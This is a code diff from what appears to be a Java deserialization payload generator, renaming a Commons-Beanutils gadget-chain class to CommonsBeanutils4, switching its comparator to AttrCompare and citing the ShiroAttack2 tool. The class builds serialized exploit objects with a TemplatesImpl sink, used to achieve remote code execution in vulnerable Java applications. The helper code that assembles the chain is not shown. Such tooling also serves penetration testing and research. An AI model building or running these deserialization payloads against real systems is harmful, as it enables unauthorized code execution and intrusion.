@@ -10,14 +10,17 @@ import com.ppp.sinks.annotation.Sink;
 
 /**
  * @author Whoopsunix
+ * Ref: https://github.com/SummerSec/ShiroAttack2
+ *
+ * CommonsBeanutilsAttrCompare
  */
-@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "commons-collections:commons-collections:3.2.1"})
-@Authors({Authors.Whoopsunix})
+@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4"})
+@Authors({Authors.DROPLET})
 @Sink({Sink.TemplatesImpl})
-public class CommonsBeanutilsReverseComparatorCC implements ObjectPayload<Object> {
+public class CommonsBeanutils4 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutilsReverseComparatorCC.class, args);
+        PayloadRunner.run(CommonsBeanutils4.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -30,6 +33,6 @@ public class CommonsBeanutilsReverseComparatorCC implements ObjectPayload<Object
     }
 
     public Object getChain(Object templates, String version) throws Exception {
-        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ReverseComparatorCC, templates, version);
+        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.AttrCompare, templates, version);
     }
 }
